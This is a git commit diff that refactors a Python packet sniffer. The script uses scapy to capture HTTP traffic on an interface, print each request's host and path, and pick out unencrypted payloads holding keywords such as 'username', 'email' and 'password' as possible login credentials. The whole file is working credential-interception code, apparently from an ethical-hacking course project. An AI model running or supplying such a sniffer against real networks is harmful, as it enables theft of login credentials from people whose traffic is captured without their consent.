2c7620cd713feba6ca056e3083e97994036c96f9
Michael Zick <1907006+michaelzick@users.noreply.github.com>
2022-08-12 22:51:25 +0000

    Cleaned up code

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -9,19 +9,30 @@ def sniffer(interface):
                 prn=process_sniffed_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + \
+        packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load_as_str = str(packet[scapy.Raw].load)
+        keywords = ['username', 'uname', 'login',
+                    'email', 'password', 'passwd', 'pass']
+        for keyword in keywords:
+            if keyword in load_as_str:
+                return load_as_str
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + \
-            packet[http.HTTPRequest].Path
-        print(url)
-        if packet.haslayer(scapy.Raw):
-            load_as_str = str(packet[scapy.Raw].load)
-            keywords = ['username', 'uname', 'login',
-                        'email', 'password', 'passwd', 'pass']
-            for keyword in keywords:
-                if keyword in load_as_str:
-                    print(load_as_str)
-                    break
+        url = get_url(packet)
+        print('[+] HTTP Request: ' + str(url))
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print(
+                '\n\n[+\] Possible username and password: ' + login_info + '\n\n')
 
 
 sniffer('eth0')
